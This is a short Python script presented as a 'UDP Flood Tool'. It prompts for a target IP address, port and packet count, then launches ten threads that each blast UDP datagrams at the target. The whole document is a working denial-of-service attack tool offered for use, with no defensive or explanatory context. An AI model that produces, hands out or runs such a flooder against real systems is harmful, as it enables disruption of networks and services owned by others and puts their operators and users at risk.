import socket
import threading

def udp_flood(target_ip, target_port, num_packets):
    print("Sending UDP flood to:", target_ip + ":" + str(target_port))
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        for _ in range(num_packets):
            sock.sendto(b"UDP Flooding", (target_ip, target_port))
    except Exception as e:
        print("Error:", e)
    finally:
        sock.close()

def main():
    print("#############################")
    print("#       UDP Flood Tool      #")
    print("#############################")

    target_ip = input("\nEnter the target IP address: ")
    target_port = int(input("Enter the target port: "))
    num_packets = int(input("Enter the number of packets to send: "))

    threads = []

    for _ in range(10):  # Number of threads for concurrent packets
        thread = threading.Thread(target=udp_flood, args=(target_ip, target_port, num_packets))
        thread.daemon = True
        thread.start()
        threads.append(thread)

    for thread in threads:
        thread.join()

if __name__ == "__main__":
    main()
